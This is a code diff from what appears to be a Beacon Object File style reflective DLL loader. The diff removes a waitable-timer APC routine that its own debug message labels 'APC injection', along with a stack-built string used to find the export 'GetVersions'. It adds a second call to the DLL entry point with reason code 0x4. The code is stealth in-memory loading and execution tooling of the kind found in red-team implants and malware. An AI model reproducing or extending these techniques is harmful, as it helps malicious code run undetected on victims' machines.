@@ -62,40 +62,6 @@ void fix_section_permissions(DLLDATA *dll, char *base_addr) {
     }
 }
 
-VOID APIENTRY TimerAPCProc(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue) {
-    APC_CALLBACK_CTX *ctx = (APC_CALLBACK_CTX *)lpArgToCompletionRoutine;
-    
-    if (ctx && ctx->fn) {
-        ctx->fn();
-    }
-    
-    if (ctx && ctx->event) {
-        KERNEL32$SetEvent(ctx->event);
-    }
-}
-
-void ExecuteViaWaitableTimer(_GetVersions pGetVersions) {
-    HANDLE hTimer = KERNEL32$CreateWaitableTimerA(NULL, TRUE, NULL);
-    HANDLE hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
-    
-    if (!hTimer || !hEvent) return;
-
-    APC_CALLBACK_CTX ctx = { .fn = pGetVersions, .event = hEvent };
-    
-    LARGE_INTEGER liDueTime;
-    liDueTime.QuadPart = -1; 
-
-    StealthDbg("Setting Waitable Timer for APC injection...\n");
-
-    if (KERNEL32$SetWaitableTimer(hTimer, &liDueTime, 0, TimerAPCProc, &ctx, FALSE)) {        
-        KERNEL32$WaitForSingleObject(hEvent, 500);
-        StealthDbg("APC execution completed successfully.\n");
-    }
-
-    KERNEL32$CloseHandle(hTimer);
-    KERNEL32$CloseHandle(hEvent);
-}
-
 void go(void)
 {
     IMPORTFUNCS funcs;
@@ -199,16 +165,9 @@ void go(void)
     StealthDbg ( "calling entry point...\n" );
     DLLMAIN_FUNC entry_point = EntryPoint(&dll_data, dll_dst);
     entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
-
+    
     KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));
 
-	char targetFunc[] = { 'G','e','t','V','e','r','s','i','o','n','s', 0 };
-    _GetVersions pGetVersions = (_GetVersions)GetExport(dll_dst, targetFunc);
-    if (pGetVersions)
-    {
-        StealthDbg("Executing target function via Waitable Timer APC...\n");
-        ExecuteViaWaitableTimer(pGetVersions);
-    } else {
-        StealthDbg("ERROR: Failed to find target function in loaded DLL.\n");
-    }
+    entry_point((HINSTANCE)(char*)go, 0x4, NULL);
+
 }
